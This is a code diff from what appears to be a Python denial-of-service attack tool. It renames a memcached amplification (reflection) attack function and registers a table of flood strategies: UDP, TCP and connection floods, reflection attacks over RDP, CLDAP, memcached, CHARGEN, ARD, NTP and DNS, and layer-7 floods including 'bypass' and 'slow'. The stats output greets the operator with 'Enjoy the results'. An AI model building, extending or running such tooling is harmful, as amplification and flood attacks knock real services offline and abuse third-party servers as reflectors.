@@ -621,7 +621,7 @@ async def CLDAP(ctx: Context, fid: int, target: Target):
     await flood_ampl_packates_gen(ctx, fid, target, packets)
 
 
-async def MEMCACHE(ctx: Context, fid: int, target: Target):
+async def MEMCACHED(ctx: Context, fid: int, target: Target):
     """Amplification (reflection) attack against memcached protocol. Protocol spec:
     https://github.com/memcached/memcached/blob/master/doc/protocol.txt
 
@@ -969,15 +969,27 @@ def show_final_stats(ctx: Context, elapsed_seconds: int, sign=""):
         f"{sign} Time spent: {elapsed_seconds:0.2f}s, "
         f"errors registered: {ctx.num_errors}. "
         f"Enjoy the results:")
-    print(tabulate(rows, headers=["Target", "Sessions", "Packets", "Traffic", "Rate", "Quality"]))
+    print(tabulate(
+        rows, headers=["Target", "Sessions", "Packets", "Traffic", "Rate", "Quality"]))
 
 
 default_strategies = {
+    # L4
     "udp": UDP,
     "tcp": TCP,
+    "connection": CONNECTION,
+    # AMPL
+    "rdp": RDP,
+    "cldap": CLDAP,
+    "memcached": MEMCACHED,
+    "mem": MEMCACHED,
+    "char": CHAR,
+    "ard": ARD,
+    "ntp": NTP,
+    "dns": DNS,
+    # L7
     "stress": STRESS,
     "bypass": BYPASS,
-    "connection": CONNECTION,
     "slow": SLOW,
     "cfbuam": CFBUAM,
     "avb": AVB,
